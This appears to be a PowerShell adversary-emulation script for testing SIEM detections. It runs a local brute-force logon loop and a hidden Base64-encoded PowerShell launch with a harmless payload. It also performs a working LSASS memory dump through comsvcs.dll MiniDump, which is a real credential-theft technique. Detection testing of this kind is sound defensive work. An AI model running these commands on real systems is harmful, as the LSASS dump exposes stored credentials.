<#
=============================================================================
 Script: attacks.ps1
 Description: Executes automated adversary techniques mapped to MITRE ATT&CK
              to generate high-severity telemetry for SIEM detection validation.
 Techniques:
   - T1110 (Brute Force): Generates Event ID 4625 (0xC000006D).
   - T1059.001 (PowerShell Obfuscation): Generates Event ID 4104 & Sysmon 1.
   - T1003.001 (Credential Access / LSASS): Generates Sysmon Event ID 10.
=============================================================================
#>

Write-Host "[!] INITIATING ADVERSARY EMULATION SEQUENCE..."

# ATTACK 1: Brute Force Simulation (Generates Event ID 4625)
Write-Host "[1/3] Simulating Brute Force Logon Failures (T1110)..."
1..5 | ForEach-Object {
    $null = net use \\127.0.0.1\IPC$ /user:Administrator "WrongPass$_" 2>&1
    Start-Sleep -Milliseconds 250
}

# ATTACK 2: Obfuscated PowerShell Dropper (Generates Event ID 4104 & Sysmon 1)
Write-Host "[2/3] Simulating Base64 Encoded PowerShell Payload (T1059.001)..."
$cmd = "Write-Host 'Simulated C2 Beacon Established!'; Start-Sleep -Seconds 1"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -NoP -NonI -W Hidden -EncodedCommand $encoded

# ATTACK 3: Credential Dumping / LSASS Access (Generates Sysmon Event ID 10)
Write-Host "[3/3] Simulating LSASS Process Memory Inspection (T1003.001)..."
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\Windows\Temp\test_dump.dmp full 2>$null
    Remove-Item C:\Windows\Temp\test_dump.dmp -ErrorAction SilentlyContinue
}

Write-Host "[+] All adversary simulation techniques executed!"